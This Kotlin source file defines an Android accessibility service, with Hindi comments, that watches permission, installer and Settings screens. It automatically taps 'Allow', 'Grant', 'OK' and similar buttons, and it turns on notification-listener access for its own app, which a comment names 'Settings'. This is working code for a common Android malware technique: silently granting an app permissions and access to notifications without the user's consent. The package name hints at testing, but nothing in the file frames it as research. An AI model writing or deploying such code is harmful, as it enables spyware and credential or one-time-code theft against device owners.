package com.security.testapp

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoPermissionService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var lastClickTime = 0L

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 200
            // केवल इन पैकेजों की विंडो देखें (Permission dialogs)
            packageNames = arrayOf(
                "com.android.permissioncontroller",
                "com.google.android.permissioncontroller",
                "com.android.packageinstaller",
                "com.android.settings"  // notification listener सेटिंग्स के लिए
            )
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return

        // एक सेकंड में एक से अधिक क्लिक न हो (तेज़ी से क्लिक रोकने के लिए)
        val now = System.currentTimeMillis()
        if (now - lastClickTime < 1000) return
        lastClickTime = now

        handler.postDelayed({
            autoClickPermissionButtons()
            enableNotificationListenerSwitch()
        }, 500) // थोड़ा रुककर क्लिक करें ताकि विंडो पूरी खुल जाए
    }

    private fun autoClickPermissionButtons() {
        val root = rootInActiveWindow ?: return
        val targetTexts = arrayOf("Allow", "ALLOW", "Allow anyway", "OK", "Grant", "Yes", "Enable")
        for (text in targetTexts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes != null) {
                for (node in nodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
        }
    }

    private fun enableNotificationListenerSwitch() {
        val root = rootInActiveWindow ?: return
        val appName = getString(R.string.app_name) // "Settings"
        val listItems = root.findAccessibilityNodeInfosByText(appName)
        if (listItems != null) {
            for (item in listItems) {
                val parent = item.parent ?: continue
                for (i in 0 until parent.childCount) {
                    val child = parent.getChild(i)
                    if (child != null &&
                        "android.widget.Switch" == child.className &&
                        !child.isChecked
                    ) {
                        child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
        }
    }

    override fun onInterrupt() {}
}
